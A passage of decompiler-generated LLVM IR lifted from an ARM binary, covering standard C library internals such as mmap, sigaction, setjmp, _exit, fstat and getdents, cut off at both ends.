  %v2_15eb0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_15eb0, i32* @r0, align 4
  %v1_15eb4 = call i32 @_setjmp(i32 %v2_15eb0)
  store i32 %v1_15eb4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15eb8 = icmp eq i32 %v1_15eb4, 0
  store i1 %v2_15eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15eb8, label %dec_label_pc_15ec0, label %dec_label_pc_15f0c

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15eb0
  %v0_15ec0 = call i32 @__aeabi_read_tp()
  store i32 %v0_15ec0, i32* %r0.global-to-local, align 4
  %v1_15ec4 = add i32 %v0_15ec0, -1168
  store i32 %v1_15ec4, i32* %r2.global-to-local, align 4
  %v2_15ecc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15ecc, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_15ed8 = add i32 %v2_15ecc, 56
  %v3_15ed8 = inttoptr i32 %v2_15ed8 to i32*
  %v4_15ed8 = load i32, i32* %v3_15ed8, align 4
  store i32 %v4_15ed8, i32* %ip.global-to-local, align 4
  store i32 %v2_15eb0, i32* %r3.global-to-local, align 4
  %v2_15ee8 = add i32 %v0_15ec0, -1040
  %v3_15ee8 = inttoptr i32 %v2_15ee8 to i32*
  store i32 %v2_15eb0, i32* %v3_15ee8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_15ef4 = load i32, i32* %ip.global-to-local, align 4
  %v1_15ef4 = inttoptr i32 %v0_15ef4 to i32*
  %v2_15ef4 = load i32, i32* %v1_15ef4, align 4
  store i32 %v2_15ef4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_15f04 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15fa8

dec_label_pc_15f0c:                               ; preds = %dec_label_pc_15eb0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_15f10 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15f10, i32* %ip.global-to-local, align 4
  %v2_15f14 = add i32 %v2_15f10, 40
  %v3_15f14 = inttoptr i32 %v2_15f14 to i32*
  %v4_15f14 = load i32, i32* %v3_15f14, align 4
  store i32 %v4_15f14, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15f14)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_15f24 = load i32, i32* %stack_var_-416, align 4
  %v2_15f28 = add i32 %v2_15f24, 120
  %v3_15f28 = inttoptr i32 %v2_15f28 to i32*
  %v4_15f28 = load i32, i32* %v3_15f28, align 4
  store i32 %v4_15f28, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f2c

dec_label_pc_15f2c:                               ; preds = %dec_label_pc_15f60.dec_label_pc_15f2c_crit_edge, %dec_label_pc_15f0c
  %v0_15f2c = phi i32 [ %v0_15f2c.pre, %dec_label_pc_15f60.dec_label_pc_15f2c_crit_edge ], [ %v4_15f28, %dec_label_pc_15f0c ]
  %v1_15f2c = inttoptr i32 %v0_15f2c to i32*
  %v2_15f2c = load i32, i32* %v1_15f2c, align 4
  store i32 %v0_15f2c, i32* %r2.global-to-local, align 4
  store i32 %v2_15f2c, i32* %r4.global-to-local, align 4
  %v1_15f38 = add i32 %v2_15f2c, -1
  store i32 %v1_15f38, i32* %r1.global-to-local, align 4
  %v2_15f3c89 = load i32, i32* %v1_15f2c, align 4
  store i32 %v2_15f3c89, i32* %r3.global-to-local, align 4
  %v3_15f4091 = icmp uge i32 %v2_15f3c89, %v2_15f2c
  store i1 %v3_15f4091, i1* %cpsr_c.global-to-local, align 1
  %v9_15f4097 = icmp eq i32 %v2_15f3c89, %v2_15f2c
  store i1 %v9_15f4097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15f4097, label %dec_label_pc_15f48, label %dec_label_pc_15f60

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f2c, %dec_label_pc_15f48.dec_label_pc_15f3c_crit_edge
  %v0_15f4898 = phi i32 [ %v1_15f40.pre, %dec_label_pc_15f48.dec_label_pc_15f3c_crit_edge ], [ %v2_15f2c, %dec_label_pc_15f2c ]
  store i32 %v0_15f4898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f58 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f58, label %dec_label_pc_15f5c, label %dec_label_pc_15f48.dec_label_pc_15f3c_crit_edge

dec_label_pc_15f48.dec_label_pc_15f3c_crit_edge:  ; preds = %dec_label_pc_15f48
  %v0_15f3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f40.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15f3c = inttoptr i32 %v0_15f3c.pre to i32*
  %v2_15f3c = load i32, i32* %v1_15f3c, align 4
  store i32 %v2_15f3c, i32* %r3.global-to-local, align 4
  %v3_15f40 = icmp uge i32 %v2_15f3c, %v1_15f40.pre
  store i1 %v3_15f40, i1* %cpsr_c.global-to-local, align 1
  %v9_15f40 = icmp eq i32 %v2_15f3c, %v1_15f40.pre
  store i1 %v9_15f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15f40, label %dec_label_pc_15f48, label %dec_label_pc_15f60

dec_label_pc_15f5c:                               ; preds = %dec_label_pc_15f48
  %v0_15f5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f60

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f2c, %dec_label_pc_15f48.dec_label_pc_15f3c_crit_edge, %dec_label_pc_15f5c
  %v0_15f68 = phi i32 [ %v0_15f5c, %dec_label_pc_15f5c ], [ %v2_15f3c89, %dec_label_pc_15f2c ], [ %v2_15f3c, %dec_label_pc_15f48.dec_label_pc_15f3c_crit_edge ]
  %v1_15f60 = phi i32 [ %v0_15f5c, %dec_label_pc_15f5c ], [ %v2_15f2c, %dec_label_pc_15f2c ], [ %v1_15f40.pre, %dec_label_pc_15f48.dec_label_pc_15f3c_crit_edge ]
  %v3_15f60 = icmp uge i32 %v0_15f68, %v1_15f60
  store i1 %v3_15f60, i1* %cpsr_c.global-to-local, align 1
  %v9_15f60 = icmp eq i32 %v0_15f68, %v1_15f60
  store i1 %v9_15f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15f60, label %dec_label_pc_15f68, label %dec_label_pc_15f60.dec_label_pc_15f2c_crit_edge

dec_label_pc_15f60.dec_label_pc_15f2c_crit_edge:  ; preds = %dec_label_pc_15f60
  %v0_15f2c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f2c

dec_label_pc_15f68:                               ; preds = %dec_label_pc_15f60
  %v2_15f68 = icmp ne i32 %v1_15f60, 0
  store i1 %v2_15f68, i1* %cpsr_c.global-to-local, align 1
  %v7_15f68 = icmp eq i32 %v1_15f60, 1
  store i1 %v7_15f68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15f68, label %dec_label_pc_15fa8, label %dec_label_pc_15f70

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f68
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15fa8

dec_label_pc_15fa8:                               ; preds = %dec_label_pc_15f68, %dec_label_pc_15f70, %dec_label_pc_15ec0
  %storemerge2 = phi i32 [ %v0_15f04, %dec_label_pc_15ec0 ], [ 0, %dec_label_pc_15f70 ], [ 0, %dec_label_pc_15f68 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_15fac = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_15fac, i32* %r0.global-to-local, align 4
  %v0_15fb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15fb0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_15fa8
  %v2_15fb0 = load i32, i32* @r8, align 4
  %v8_15fb4 = shl i32 %v2_15fb0, %v1_15fac
  %v9_15fb4 = and i32 %v8_15fb4, %v1_15fac
  %v8_15fb8 = lshr i32 %v2_15fb0, %v9_15fb4
  %v9_15fb8 = and i32 %v8_15fb8, %v9_15fb4
  %v2_15fbc = inttoptr i32 %v9_15fb8 to i64*
  %v3_15fbc = load i64, i64* %v2_15fbc, align 4
  %v4_15fbc = load i32, i32* %ip.global-to-local, align 4
  %v5_15fbc = trunc i64 %v3_15fbc to i32
  %v6_15fbc = udiv i64 %v3_15fbc, 4294967296
  %v7_15fbc = trunc i64 %v6_15fbc to i32
  store i32 %v5_15fbc, i32* %r1.global-to-local, align 4
  %v9_15fbc = sub i32 %v7_15fbc, %v4_15fbc
  %v1_15fc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_15fc0 = mul i32 %v9_15fbc, %v1_15fc0
  %v5_15fc8 = mul i32 %v1_15fc0, 4
  %v6_15fc8 = and i32 %v5_15fc8, %v3_15fc0
  %v5_15fcc = udiv i32 %v1_15fc0, 2
  %v6_15fcc = and i32 %v6_15fc8, %v5_15fcc
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_15fcc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_15fa8, %bb85
  %v5_15fd0 = phi i32 [ %v1_15fac, %dec_label_pc_15fa8 ], [ %v6_15fcc, %bb85 ]
  ret i32 %v5_15fd0

; uselistorder directives
  uselistorder i32 %v1_15fc0, { 1, 0, 2 }
  uselistorder i32 %v1_15fac, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_15f60, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15f5c, { 1, 0, 2 }
  uselistorder i32 %v1_15f40.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15f2c, { 1, 0 }
  uselistorder i32 %v2_15e8c, { 1, 0 }
  uselistorder i32 %v2_15e64.pre, { 2, 0, 1 }
  uselistorder i32 %v1_15e58, { 1, 0 }
  uselistorder i32 %v1_15e54, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15e48, { 1, 0 }
  uselistorder i32 %v1_15e14, { 1, 0 }
  uselistorder i32 %v1_15e10, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15e04, { 1, 0 }
  uselistorder i32 %v2_15de0, { 1, 0, 2 }
  uselistorder i32 %v4_15dc4, { 1, 0, 2 }
  uselistorder i32 %v4_15db4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_15cfc, { 1, 2, 0 }
  uselistorder i32 %v2_15cc8, { 1, 2, 0 }
  uselistorder i32 %v1_15cc4, { 1, 2, 0 }
  uselistorder i1 %v2_15cb0, { 1, 0, 2 }
  uselistorder i32 %v5_15cb4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15c80, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15c68, { 1, 0, 2 }
  uselistorder i32 %v2_15c5c, { 1, 0, 2 }
  uselistorder i32 %v3_15c2c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 1, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 2, 3, 4, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 2, 15, 17, 16, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 1, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 3, 2, 0, 1, 4 }
  uselistorder i32 120, { 0, 2, 1, 4, 3 }
  uselistorder i32 2012, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_15fa8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15f60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f48, { 1, 0 }
  uselistorder label %dec_label_pc_15eb0, { 1, 0 }
  uselistorder label %dec_label_pc_15e88, { 1, 0 }
  uselistorder label %dec_label_pc_15e04, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15d80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d58, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_15cc8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_15cb0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15ffc = load i32, i32* @r4, align 4
  store i32 %v3_15ffc, i32* %stack_var_-16, align 4
  %v3_16008 = urem i32 %arg4, 4096
  %v2_1600c = icmp eq i32 %v3_16008, 0
  br i1 %v2_1600c, label %dec_label_pc_16030, label %dec_label_pc_16014

dec_label_pc_16014:                               ; preds = %entry
  %v0_16018 = call i32 @__aeabi_read_tp()
  store i32 %v0_16018, i32* %r0.global-to-local, align 4
  %v3_1601c = load i16, i16* @global_var_233d0.483, align 2
  %v4_1601c = sext i16 %v3_1601c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16028 = add i32 %v4_1601c, %v0_16018
  %v4_16028 = inttoptr i32 %v3_16028 to i32*
  store i32 22, i32* %v4_16028, align 4
  %v0_16064.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16064

dec_label_pc_16030:                               ; preds = %entry
  %v0_16040 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16040, -4095
  br i1 %tmp, label %dec_label_pc_16060, label %dec_label_pc_16048

dec_label_pc_16048:                               ; preds = %dec_label_pc_16030
  %v1_1604c = sub i32 0, %v0_16040
  %v3_16050 = load i16, i16* @global_var_233d0.483, align 2
  %v4_16050 = sext i16 %v3_16050 to i32
  %v0_16054 = call i32 @__aeabi_read_tp()
  %v3_16058 = add i32 %v4_16050, %v0_16054
  %v4_16058 = inttoptr i32 %v3_16058 to i32*
  store i32 %v1_1604c, i32* %v4_16058, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16060

dec_label_pc_16060:                               ; preds = %dec_label_pc_16030, %dec_label_pc_16048
  %v0_16060 = phi i32 [ %v0_16040, %dec_label_pc_16030 ], [ -1, %dec_label_pc_16048 ]
  store i32 %v0_16060, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %dec_label_pc_16014, %dec_label_pc_16060
  %v0_16064 = phi i32 [ %v0_16064.pre, %dec_label_pc_16014 ], [ %v0_16060, %dec_label_pc_16060 ]
  store i32 %v0_16064, i32* %r0.global-to-local, align 4
  %v2_16068 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16068, i32* @r4, align 4
  ret i32 %v0_16064

; uselistorder directives
  uselistorder i32 %v0_16064, { 1, 0 }
  uselistorder i32 %v0_16040, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_16064, { 1, 0 }
  uselistorder label %dec_label_pc_16060, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_16078 = load i32, i32* @lr, align 4
  store i32 %v0_16078, i32* %stack_var_-4, align 4
  %v0_16080 = load i32, i32* @r0, align 4
  %v3_16084 = load i16, i16* @global_var_233d0.483, align 2
  %v4_16084 = sext i16 %v3_16084 to i32
  store i32 %v4_16084, i32* @r2, align 4
  %v0_16088 = call i32 @__aeabi_read_tp()
  %v1_1608c = sub i32 0, %v0_16080
  store i32 %v1_1608c, i32* @r3, align 4
  %v2_16090 = load i32, i32* @r2, align 4
  %v3_16090 = add i32 %v2_16090, %v0_16088
  %v4_16090 = inttoptr i32 %v3_16090 to i32*
  store i32 %v1_1608c, i32* %v4_16090, align 4
  %v2_16098 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16098, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_160a4 = load i32, i32* @r4, align 4
  %v6_160a4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_160ac = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_160ac, label %dec_label_pc_16100, label %dec_label_pc_160c4

dec_label_pc_160c4:                               ; preds = %entry
  %v1_160c4 = add i32 %arg2, 4
  %v2_160c4 = inttoptr i32 %v1_160c4 to i32*
  %v3_160c4 = load i32, i32* %v2_160c4, align 4
  store i32 %v3_160c4, i32* @r3, align 4
  %v1_160c8 = and i32 %v3_160c4, 67108864
  %v2_160c8 = icmp eq i32 %v1_160c8, 0
  br i1 %v2_160c8, label %dec_label_pc_160d0, label %dec_label_pc_16100

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160c4
  store i32 20, i32* @r2, align 4
  %v2_160d4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_160d4, i32* @r0, align 4
  %v0_160d8 = call i32 @memcpy()
  store i32 %v2_160d4, i32* @ip, align 4
  %v0_16100.pre = load i32, i32* @r5, align 4
  %v0_16108.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16100

dec_label_pc_16100:                               ; preds = %dec_label_pc_160c4, %entry, %dec_label_pc_160d0
  %v0_16108 = phi i32 [ %arg3, %dec_label_pc_160c4 ], [ %arg3, %entry ], [ %v0_16108.pre, %dec_label_pc_160d0 ]
  %v0_16104 = phi i32 [ %arg2, %dec_label_pc_160c4 ], [ 0, %entry ], [ %v2_160d4, %dec_label_pc_160d0 ]
  %v0_16100 = phi i32 [ %arg1, %dec_label_pc_160c4 ], [ %arg1, %entry ], [ %v0_16100.pre, %dec_label_pc_160d0 ]
  %v4_16110 = call i32 @__syscall_rt_sigaction(i32 %v0_16100, i32 %v0_16104, i32 %v0_16108, i32 8)
  store i32 %v3_160a4, i32* @r4, align 4
  store i32 %v6_160a4, i32* @r5, align 4
  ret i32 %v4_16110

; uselistorder directives
  uselistorder label %dec_label_pc_16100, { 2, 0, 1 }
}

define i32 @function_16124(i32 %arg1) local_unnamed_addr {
dec_label_pc_16124:
  %v0_16124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16124, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16124
  %v2_16124 = load i32, i32* @r8, align 4
  %v4_16124 = mul i32 %v2_16124, 2
  %v5_16124 = and i32 %v4_16124, %arg1
  %v2_16128 = load i32, i32* @ip, align 4
  %v4_16128 = lshr i32 %v2_16128, %v5_16124
  %v5_16128 = sub i32 32, %v5_16124
  %v6_16128 = shl i32 %v2_16128, %v5_16128
  %v7_16128 = or i32 %v6_16128, %v4_16128
  %v9_16128 = and i32 %v7_16128, %v5_16124
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16124, %bb
  %v10_16128 = phi i32 [ %arg1, %dec_label_pc_16124 ], [ %v9_16128, %bb ]
  ret i32 %v10_16128

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_16130 = call i32 @__sigsetjmp()
  ret i32 %v0_16130
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16160 = load i32, i32* @r7, align 4
  store i32 %v3_16160, i32* %stack_var_-8, align 4
  %v0_1616c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1616c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1616c, -4095
  br i1 %tmp, label %dec_label_pc_16194, label %dec_label_pc_1617c

dec_label_pc_1617c:                               ; preds = %entry
  %v0_16180 = call i32 @__aeabi_read_tp()
  %v3_16184 = load i16, i16* @global_var_233d0.483, align 2
  %v4_16184 = sext i16 %v3_16184 to i32
  %v0_16188 = load i32, i32* %r2.global-to-local, align 4
  %v1_16188 = sub i32 0, %v0_16188
  store i32 %v1_16188, i32* %r2.global-to-local, align 4
  %v3_1618c = add i32 %v4_16184, %v0_16180
  %v4_1618c = inttoptr i32 %v3_1618c to i32*
  store i32 %v1_16188, i32* %v4_1618c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16194.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16194

dec_label_pc_16194:                               ; preds = %entry, %dec_label_pc_1617c
  %v1_16198 = phi i32 [ %v0_1616c, %entry ], [ -1, %dec_label_pc_1617c ]
  %v2_16194 = phi i32 [ %v3_16160, %entry ], [ %v2_16194.pre, %dec_label_pc_1617c ]
  store i32 %v2_16194, i32* @r7, align 4
  ret i32 %v1_16198

; uselistorder directives
  uselistorder i32 %v0_1616c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16194, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_161ac

dec_label_pc_161ac:                               ; preds = %dec_label_pc_161d8, %dec_label_pc_161ec, %entry
  %v0_161ac = phi i32 [ %arg1, %entry ], [ %v0_161ac.pre.pre, %dec_label_pc_161ec ], [ %v0_161d8, %dec_label_pc_161d8 ]
  store i32 %v0_161ac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_161ac, -4095
  br i1 %tmp, label %dec_label_pc_161d8, label %dec_label_pc_161c8

dec_label_pc_161c8:                               ; preds = %dec_label_pc_161ac
  %v0_161c8 = call i32 @__aeabi_read_tp()
  %v0_161cc = load i32, i32* %r2.global-to-local, align 4
  %v1_161cc = sub i32 0, %v0_161cc
  store i32 %v1_161cc, i32* %r2.global-to-local, align 4
  %v3_161d0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_161d0 = sext i16 %v3_161d0 to i32
  %v3_161d4 = add i32 %v4_161d0, %v0_161c8
  %v4_161d4 = inttoptr i32 %v3_161d4 to i32*
  store i32 %v1_161cc, i32* %v4_161d4, align 4
  %v0_161d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_161d8

dec_label_pc_161d8:                               ; preds = %dec_label_pc_161ac, %dec_label_pc_161c8
  %v0_161d8 = phi i32 [ %v0_161ac, %dec_label_pc_161ac ], [ %v0_161d8.pre, %dec_label_pc_161c8 ]
  store i32 %v0_161d8, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_161d8, -4095
  br i1 %tmp4, label %dec_label_pc_161ac, label %dec_label_pc_161ec

dec_label_pc_161ec:                               ; preds = %dec_label_pc_161d8
  %v0_161ec = call i32 @__aeabi_read_tp()
  %v0_161f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_161f0 = sub i32 0, %v0_161f0
  store i32 %v1_161f0, i32* %r2.global-to-local, align 4
  %v3_161f4 = load i16, i16* @global_var_233d0.483, align 2
  %v4_161f4 = sext i16 %v3_161f4 to i32
  %v3_161f8 = add i32 %v4_161f4, %v0_161ec
  %v4_161f8 = inttoptr i32 %v3_161f8 to i32*
  store i32 %v1_161f0, i32* %v4_161f8, align 4
  %v0_161ac.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_161ac

; uselistorder directives
  uselistorder i32 %v0_161d8, { 0, 2, 1 }
  uselistorder i32 %v0_161ac, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_161d8, { 1, 0 }
  uselistorder label %dec_label_pc_161ac, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_16210 = load i32, i32* @r1, align 4
  store i32 %v0_16210, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_16220 = load i32, i32* @r0, align 4
  store i32 %v0_16220, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16220, -4095
  br i1 %tmp, label %dec_label_pc_16248, label %dec_label_pc_1622c

dec_label_pc_1622c:                               ; preds = %entry
  %v0_16230 = call i32 @__aeabi_read_tp()
  %v3_16234 = load i16, i16* @global_var_233d0.483, align 2
  %v4_16234 = sext i16 %v3_16234 to i32
  store i32 %v4_16234, i32* @r3, align 4
  %v0_16238 = load i32, i32* @r2, align 4
  %v1_16238 = sub i32 0, %v0_16238
  store i32 %v1_16238, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_16240 = add i32 %v4_16234, %v0_16230
  %v4_16240 = inttoptr i32 %v3_16240 to i32*
  store i32 %v1_16238, i32* %v4_16240, align 4
  br label %dec_label_pc_16258

dec_label_pc_16248:                               ; preds = %entry
  store i32 %v0_16220, i32* %r7.global-to-local, align 4
  %v2_16248 = icmp eq i32 %v0_16220, 0
  br i1 %v2_16248, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16248
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16248, %bb
  call void @__pseudo_cond_branch(i1 %v2_16248, i32 ptrtoint (i32* @global_var_16698.711 to i32))
  br label %dec_label_pc_16258

dec_label_pc_16258:                               ; preds = %dec_label_pc_1622c, %.thread
  %v0_16258 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16258

; uselistorder directives
  uselistorder i32 %v0_16220, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16258, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_1626c = load i32, i32* @r5, align 4
  %v18_1626c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_162a4, label %dec_label_pc_16288

dec_label_pc_16288:                               ; preds = %entry
